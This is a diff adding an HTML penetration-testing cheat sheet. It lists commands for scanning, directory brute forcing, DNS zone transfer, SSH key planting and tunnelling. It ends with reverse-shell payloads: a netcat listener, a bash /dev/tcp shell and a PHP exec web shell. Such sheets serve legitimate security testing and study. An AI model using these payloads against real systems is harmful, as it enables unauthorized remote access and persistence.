@@ -1,1 +1,86 @@
-<html> </html>
+<!DOCTYPE html>
+<html>
+<h3>NMAP</h3>
+<table>
+<tr>
+<td style="color:#3276B1; width: 40%;">Quick Scan</td>
+    <td style='font-family: "Courier 10 Pitch", Courier, monospace;'><code>nmap -sV -sC -A $IP </code></td>
+</tr>
+</table>
+<h3>Useful NMAP Scripts</h3><html>
+<h4>View scripts</h4>
+<p><code>ls /usr/share/nmap/scripts</code></p>
+    
+<h3>Webservers</h3>
+<table>
+<tr>
+<td style="color:#3276B1; width: 40%;">Vulnerability</td>
+    <td style='font-family: "Courier 10 Pitch", Courier, monospace;'><code>nikto -h http://$IP </code></td>
+</tr>
+<tr>
+<td style="color:#3276B1; width: 40%;">Directory Brute Force</td>
+<td style='font-family: "Courier 10 Pitch", Courier, monospace;'><code>dirb http://$IP rockyou.txt -w -X .php,.html,.txt</code></td>
+</tr>
+</table>
+    
+<h3>DNS</h3><html>
+<table>
+<tr>
+<td style="color:#3276B1; width: 40%;">Zone Transfer</td>
+    <td style='font-family: "Courier 10 Pitch", Courier, monospace;'><code>dig axfr $domain-name @$IP<br/>ie. dig axfr @10.120.0.3 -p 6362 namezone.com</code></td>
+</tr>
+<tr>
+<td style="color:#3276B1; width: 40%;">Enum</td>
+<td style='font-family: "Courier 10 Pitch", Courier, monospace;'><code>dnsrecon -d $domain-name</code></td>
+</tr>
+</table>
+    
+<h3>Linux</h3>
+<table>
+<tr>
+<td style="color:#3276B1; width: 40%;">General</td>
+<td style='font-family: "Courier 10 Pitch", Courier, monospace;'><code>crontab -l<br/>aux -ps</code></td>
+</tr>
+<tr>
+<td style="color:#3276B1; width: 40%;">Very useful link</td>
+<td style='font-family: "Courier 10 Pitch", Courier, monospace;'><a href="https://gtfobins.github.io/"> gtfobins.github.io</a></td>
+</tr>
+</table>
+    
+<h3>SSH</h3>
+<table>
+<tr>
+<td style="color:#3276B1; width: 40%;">Copy</td>
+    <td style='font-family: "Courier 10 Pitch", Courier, monospace;'><code>scp [source_file] [user]@$IP:[destination_path]</code></td>
+</tr>
+<tr>
+<td style="color:#3276B1; width: 40%;">Mount</td>
+<td style='font-family: "Courier 10 Pitch", Courier, monospace;'><code>sshfs [user]@$IP:[destination_path] [source_file]</code></td>
+</tr>
+<tr>
+<td style="color:#3276B1; width: 40%;">Copy local SSH Key (~/.ssh/id_rsa.pub) into remote Host</td>
+    <td style='font-family: "Courier 10 Pitch", Courier, monospace;'><code>mkdir -p ~/.ssh &#38&#38 chmod 700 ~/.ssh &#38&#38 touch ~/.ssh/authorized_keys &#38&#38 chmod 600 ~/.ssh/authorized_keys &#38&#38 echo "ssh-rsa &#60INSERT KEY&#62; root@HOSTNAME" >> ~/.ssh/authorized_keys<br/><br/>ssh -i ~/.ssh/id_rsa &#60user&#62@&#60IP&#62</code></td>
+</tr>
+<tr>
+<td style="color:#3276B1; width: 40%;">SSH Tunnel Dynamic Port Forwarding</td>
+    <td style='font-family: "Courier 10 Pitch", Courier, monospace;'><code>vim /etc/proxychains.conf (edit conf to set listening port)<br/>ssh -D &#60listening port&#62 <host> -l &#60username&#62<br/>(leave window with above command running)<br/>proxychains &#60command&#62 (nmap/firefox etc)</code></td>
+</tr>
+</table>
+    
+<h3>Reverse Shell</h3>
+<table>
+<tr>
+<td style="color:#3276B1; width: 40%;">Listen</td>
+<td style='font-family: "Courier 10 Pitch", Courier, monospace;'><code>nc -nlvp 12345</code></td>
+</tr>
+<tr>
+<td style="color:#3276B1; width: 40%;">Bash</td>
+    <td style='font-family: "Courier 10 Pitch", Courier, monospace;'><code>/bin/bash -i >& /dev/tcp/&#60ip&#62/12345 0>&1</code></td>
+</tr>
+<tr>
+<td style="color:#3276B1; width: 40%;">PHP</td>
+    <td style='font-family: "Courier 10 Pitch", Courier, monospace;'><code> &#60?php exec(“/bin/bash -c ‘bash -i >& /dev/tcp/&#60ip&#62/12345 0>&1’”); phpinfo(); ?&#62</code></td>
+</tr>
+</table>
+    
+</html>
